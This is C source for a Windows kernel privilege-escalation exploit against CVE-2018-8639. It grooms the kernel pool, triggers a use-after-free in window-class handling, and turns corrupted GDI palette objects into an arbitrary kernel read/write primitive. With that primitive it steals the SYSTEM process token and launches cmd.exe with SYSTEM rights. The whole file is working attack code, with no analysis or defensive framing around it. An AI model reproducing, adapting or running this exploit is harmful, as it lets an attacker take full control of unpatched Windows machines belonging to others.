#include "stdio.h"
#include "stdafx.h"
#include "windows.h"
#include "psapi.h"


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;


HDC			hDC_Writer[1000];
CHAR		flag[0x80] = "ze0r is so cool!\x00\x00\x00";
DWORD		buf[0x20];

HPALETTE	hPltMgr;
HPALETTE	hPltWkr;
HPALETTE	hPalettes[4000];

DWORD		NtUserUnregisterClass;
DWORD		NtGdiSetLinkedUFIs;

VersionSpecificConfig gConfig = { 0xb4, 0xf8 };

typedef int (WINAPI *NTGdiSetLinkedUFIs)(HDC hdc,CHAR *buf, int len);
typedef void (WINAPI *NTUserUnregisterClass)(PUNICODE_STRING pClsName, HINSTANCE inst, PULONG p);
NTGdiSetLinkedUFIs pfnNtGdiSetLinkedUFIs;
NTUserUnregisterClass pfnNtUserUnregisterClass;

void ReadMem(DWORD Addr, DWORD len) {
	buf[0] = Addr;
	SetPaletteEntries(hPltMgr, 0x3E, 1, (LPPALETTEENTRY)buf);
	GetPaletteEntries(hPltWkr, 0, len, (LPPALETTEENTRY)buf);
}

ULONG GetNTOsBase()
{
	DWORD	needed = 0;
	ULONG	Bases[0x1000];
	ULONG	krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

DWORD PsInitialSystemProcess()
{
	ULONG		Module = (ULONG64)LoadLibraryA("ntoskrnl.exe");
	ULONG		Addr = (ULONG64)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");
	ULONG		res = 0;
	ULONG		ntOsBase = GetNTOsBase();

	if (ntOsBase) {
		ReadMem(Addr - Module + ntOsBase + 0x11000, 1);
		res = buf[0];
	}

	FreeLibrary((HMODULE)Module);
	return res;
}

ULONG PsGetCurrentProcess(ULONG sysEPS)
{
	ULONG		pEPROCESS = sysEPS;
	ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset, 2);
	while (TRUE) {
		pEPROCESS = buf[1] - gConfig.UniqueProcessIdOffset - sizeof(ULONG);
		ReadMem(pEPROCESS + gConfig.UniqueProcessIdOffset, 2);
		if (GetCurrentProcessId() == buf[0]) {
			return pEPROCESS;
		}
	}
}

LPACCEL		lpAccel;
HACCEL		hAccel_0xE00[2000];
HACCEL		hAccel_0x200[2000];

void PoolFengShui() {

	for (int i = 0; i < 1000; i++) {
		hDC_Writer[i] = CreateCompatibleDC(NULL);
	}

	for (int i = 0; i < 2000; i++) {
		hAccel_0xE00[i] = CreateAcceleratorTableW(lpAccel, 0x250);
	}

	for (int i = 0; i < 2000; i++) {
		hAccel_0x200[i] = CreateAcceleratorTableW(lpAccel, 0x53);
	}
}

void GetMgrAndWkr() {

	ULONG	res[0x80 / 4];
	PDWORD  buf = (PDWORD)flag;
	*buf = 0x501;
	*(buf + 1) = 0xfff;
	for (int i = 0; i < 1000; i++) {
		pfnNtGdiSetLinkedUFIs(hDC_Writer[i],(CHAR *)buf, 1);
	}

	ZeroMemory(res, 0x80 / 4);
	for (int i = 0; i < 4000; i++) {
		if (GetPaletteEntries(hPalettes[i], 0x2B, 0x10, (LPPALETTEENTRY)res)) {
			hPltMgr = hPalettes[i];
			hPltWkr = (HPALETTE)res[0];
		}
	}
	for (int i = 0; i < 4000; i++) {
		if ((hPalettes[i] != hPltMgr) && (hPalettes[i] != hPltWkr)){
			DeleteObject(hPalettes[i]);
		}
	}

	for (int i = 0; i < 2000; i++) {
		DestroyAcceleratorTable(hAccel_0xE00[i]);
	}
}

void GetSystem() {

	ULONG		SelfToken = 0;
	ULONG		SystemToken = 0;
	DWORD		SystemEPS;
	DWORD		CurrentEPS;

	STARTUPINFO stStartUpInfo = { sizeof(stStartUpInfo) };
	PROCESS_INFORMATION pProcessInfo;
	WCHAR	cmd[] = L"c:\\\\windows\\\\system32\\\\cmd.exe";

	SystemEPS = PsInitialSystemProcess();
	CurrentEPS = PsGetCurrentProcess(SystemEPS);

	printf("[*] GOT System EPROCESS!\n");
	ReadMem(SystemEPS + gConfig.TokenOffset, 1);
	SystemToken = buf[0];
	buf[0] = CurrentEPS + gConfig.TokenOffset;
	SetPaletteEntries(hPltMgr, 0x3E, 1, (LPPALETTEENTRY)buf);

	GetPaletteEntries(hPltWkr, 0, 1, (LPPALETTEENTRY)&SelfToken);
	SetPaletteEntries(hPltWkr, 0, 1, (LPPALETTEENTRY)&SystemToken);

	printf("[*] Swaping shell.\n\n");
	ZeroMemory(&stStartUpInfo, sizeof(STARTUPINFO));
	stStartUpInfo.cb = sizeof(STARTUPINFO);
	stStartUpInfo.dwFlags = STARTF_USESHOWWINDOW;
	stStartUpInfo.wShowWindow = 1;
	CreateProcess(cmd, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &stStartUpInfo, &pProcessInfo);
	SetPaletteEntries(hPltWkr, 0, 1, (LPPALETTEENTRY)&SelfToken);

}

int main()
{
	printf("////////////////////////////////////////////////////////\n");
	printf("//                                                    //\n");
	printf("//             CVE-2018-8639 EXPLOIT                  //\n");
	printf("//                                  Date  : 2019/2/21 //\n");
	printf("//                                  Author: ze0r      //\n");
	printf("////////////////////////////////////////////////////////\n\n");

	ULONG			a = 0xa;
	HDESK			hNewDesk;
	HWND			hWndCloneCls;
	CHAR			RegMenuName[240];
	CHAR			NewMenuName[] = "ze0r";
	WNDCLASSEXA		wndClass;
	HMODULE			hInst = GetModuleHandleA(NULL);
	PUNICODE_STRING pClassName = (PUNICODE_STRING)malloc(sizeof(UNICODE_STRING));

	memset(RegMenuName, 0x78, 240);
	RegMenuName[239] = 0;

	pClassName->Length = 0x18;
	pClassName->MaximumLength = 0x1a;
	pClassName->Buffer = L"WNDCLASSMAIN";
	
	pfnNtGdiSetLinkedUFIs = (NTGdiSetLinkedUFIs)((DWORD)GetProcAddress(GetModuleHandle(L"GDI32.dll"), "SetMagicColors") - 0x14);
	pfnNtUserUnregisterClass = (NTUserUnregisterClass)((DWORD)GetProcAddress(GetModuleHandle(L"USER32.dll"), "UnregisterClassW") - 0x14);
	
	//size of Palette = 0x100;
	LOGPALETTE *lPalette = (LOGPALETTE*)malloc(0xA4);
	memset(lPalette, 0x55, 0xA4);
	lPalette->palNumEntries = 0x28;
	lPalette->palVersion = 0x300;

	
	wndClass = { 0 };
	wndClass.cbSize = sizeof(WNDCLASSEXW);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInst;
	wndClass.lpszMenuName = RegMenuName;
	wndClass.lpszClassName = "WNDCLASSMAIN";

	lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * 2);
	SecureZeroMemory(lpAccel, sizeof(ACCEL));
	PoolFengShui();

	//Register window class
	printf("[*] Register Class.\n");
	RegisterClassExA(&wndClass);

	//Switch to a new Desktop
	hNewDesk = CreateDesktopA("ze0r", NULL, NULL, DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, NULL);
	SetThreadDesktop(hNewDesk);
	hWndCloneCls = CreateWindowA("WNDCLASSMAIN", "CVE", WS_DISABLED, 0, 0, 0, 0, nullptr, nullptr, hInst, nullptr);

	//Trigger Release memory
	SetClassLongA(hWndCloneCls, -8, (ULONG64)NewMenuName);
	//Reuse memory
	for (int i = 0; i < 1000; i++) {
		pfnNtGdiSetLinkedUFIs(hDC_Writer[i],flag, 0x3d);
	}

	//Trigger vul;
	printf("[*] Trigger vul.\n");
	DestroyWindow(hWndCloneCls);
	pfnNtUserUnregisterClass(pClassName, hInst, &a);

	//Destroy and ReAlloc memory,this will cause memory merge;
	for (int i = 0; i < 2000; i++) {
		DestroyAcceleratorTable(hAccel_0xE00[i]);
	}
	for (int i = 0; i < 2000; i++) {
		hAccel_0xE00[i] = CreateAcceleratorTableW(lpAccel, 0x250);
	}
	//Alloc Palette
	for (int i = 0; i < 4000; i++) {
		hPalettes[i] = CreatePalette(lPalette);
	}

	printf("[*] Find Manager and Worker.\n");
	GetMgrAndWkr();

	GetSystem();
	CloseDesktop(hNewDesk);
	Sleep(0x36000);
    return 0;
}

